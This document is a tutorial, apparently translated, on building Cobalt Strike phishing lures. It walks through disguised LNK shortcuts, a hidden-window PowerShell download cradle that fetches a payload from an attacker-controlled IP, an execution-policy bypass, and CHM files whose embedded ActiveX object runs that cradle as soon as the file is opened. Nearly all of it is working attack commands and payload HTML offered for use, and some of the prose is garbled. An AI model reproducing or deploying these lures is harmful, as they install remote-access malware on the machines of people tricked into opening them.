# Penetration Test & Phishing Documents

## Documentation link

### link link

​ First create a new listener on `CobaltStrike`, then select Attack->`Web Attack->`Web` Delivery, and create a malicious link for powershell.

```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.50.167:8000/update.exe'))"
```

![](img/1.png)

​ Use the method of unparametered call to execute the malicious link of `powershell`. First create a malicious `dll` file, with the following commands (the command can be executed before the statement in `frp`):

```cmd
# Use the bypass policy in the powershell policy. This method will not change the configuration or require writing to disk, and there will be no warnings or prompts. If you use Unrestricted, there will be warnings when running unsigned scripts downloaded online.
!cmd.exe /k powershell -exec bypass update.ps1
```

![](img/2.png)

​ Then create a shortcut for `ftp.exe`, leaving the starting position of the shortcut blank, the target is `C:\Winodws\System32\ftp.exe -""s:winsupdate.dll`, and the icon and name of the shortcut can be properly disguised.

![](img/4.png)

![](img/3.png)

### link shortcuts

​ First look for the location of `powershell.exe`, select `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` here.

![](img/5.png)

​ I still create a malicious link to the `powershell` link as before, create a `link` shortcut, modify `powershell.exe` to the absolute path, and the target of the shortcut is the following command:

```shell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.50.167:8000/update.exe'))"
```

![](img/6.png)

### chm documentation

​ Use `EasyCHM` to create a `chm` file. The `chm` document phishing file production process is: make `html`->make `chm` file->camouflage->open `chm` to go online.

Create the `html` file, the code is as follows:

```html
<html>
    <head>
        <title>Mousejack replay</title>
    </head>
    <body>
        command exec
        <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
            <PARAM name="Command" value="ShortCut">
            <PARAM name="Button" value="Bitmap::shortcut">
            <PARAM name="Item1" value=',notepad.exe'>
            <PARAM name="Item2" value="273,1,1">
        </OBJECT>
        <SCRIPT>
            x.Click();
        </SCRIPT>
    </body>
</html>
```

​ Then use `EasyCHM` to create a `chm` document, create a new project, and select the folder where the `html` file above is located in the project directory.

![](img/7.png)

​ Click Compile to generate the `chm` file.

![](img/8.png)

![](img/9.png)

​ Try to use the `CobaltStrike` Trojan and `CHM` file to go online. As mentioned above, first create a new listener on `CobaltStrike`, then select Attack->`Web` Attack->`Web` Delivery, and create a malicious link for powershell`. Replace the generated `powershell` command with the previous `notepad.exe`:

```html
<html>
    <head>
        <title>Mousejack replay</title>
    </head>
    <body>
        command exec
        <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
            <PARAM name="Command" value="ShortCut">
            <PARAM name="Button" value="Bitmap::shortcut">
            <PARAM name="Item1" value=",powershell.exe,-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.103:8078/a'))">
            <PARAM name="Item2" value="273,1,1">
        </OBJECT>
        <SCRIPT>
            x.Click();
        </SCRIPT>
    </body>
</html>
```

​ Then compile the CHM file with the same steps as above and open it and run it.

![](img/10.png)